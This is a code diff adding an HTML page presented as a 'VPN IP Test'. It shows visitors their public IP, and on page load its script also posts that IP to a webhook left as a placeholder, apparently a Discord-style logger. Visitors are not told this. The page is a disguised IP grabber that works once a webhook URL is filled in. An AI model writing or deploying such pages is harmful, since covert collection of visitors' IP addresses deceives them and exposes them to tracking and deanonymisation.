@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>IP Test</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #111;
+    color: white;
+    text-align: center;
+    padding-top: 100px;
+}
+.box {
+    background: #1e1e1e;
+    padding: 30px;
+    border-radius: 10px;
+    display: inline-block;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+<h1>VPN IP Test</h1>
+<p id="ip">Checking your IP...</p>
+</div>
+
+<script>
+const WEBHOOK = "PUT_YOUR_WEBHOOK_URL_HERE";
+
+async function getIP() {
+    try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+
+        const ip = data.ip;
+        document.getElementById("ip").innerText = "Your IP: " + ip;
+
+        fetch(WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "IP detected: " + ip
+            })
+        });
+
+    } catch (err) {
+        document.getElementById("ip").innerText = "Error getting IP";
+    }
+}
+
+getIP();
+</script>
+
+</body>
+</html>
